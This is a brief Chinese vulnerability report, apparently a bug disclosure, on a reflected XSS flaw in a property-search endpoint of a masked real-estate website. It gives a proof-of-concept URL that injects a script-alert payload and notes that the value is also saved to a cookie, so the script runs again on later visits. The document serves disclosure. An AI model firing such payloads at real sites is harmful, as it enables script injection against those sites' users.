## 链接网站搜索楼盘接口存在XSS问题

POC

```html
http://sz.xxxx.com/loupan/rs%22%3E%3Cscript%3Ealert%281%29%3C/script%3E
```

原因：反射型XSS，输出到HTML页面了，同时要保存到cookie里，造成重复触发。

![](/images/20150916232022.png)
